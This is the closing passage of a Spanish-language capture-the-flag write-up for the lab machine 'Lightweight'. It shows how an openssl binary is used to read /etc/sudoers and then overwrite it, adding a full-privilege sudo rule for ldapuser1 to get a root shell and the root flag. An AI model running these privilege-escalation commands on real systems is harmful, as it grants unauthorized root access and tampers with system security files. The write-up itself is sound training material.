Defaults    env_keep += "LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"
Defaults    env_keep += "LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"
Defaults    env_keep += "LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"
Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin
root	ALL=(ALL) 	ALL
%wheel	ALL=(ALL)	ALL
[ldapuser1@lightweight ~]$
```

Ahora que hemos visto que podemos leer archivos, también podemos escribir cambiando in por out. Armamos un backup y agregamos a mister ldapuser1:

```
[ldapuser1@lightweight ~]$ ./openssl enc -in /etc/sudoers > /dev/shm/sudoers
[ldapuser1@lightweight ~]$ (./openssl enc -in /dev/shm/sudoers; printf 'ldapuser1\tALL=(ALL)\tALL\n') | ./openssl enc -out /etc/sudoers
```

Ahora solo basta probar:

```text
[ldapuser1@lightweight ~]$ sudo -s
[sudo] password for ldapuser1:
[root@lightweight ldapuser1]#
```

Damm ya tenemos shell de root.

# cat root.txt

```text
[root@lightweight ldapuser1]# cat /root/root.txt
```

... We got root and user flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
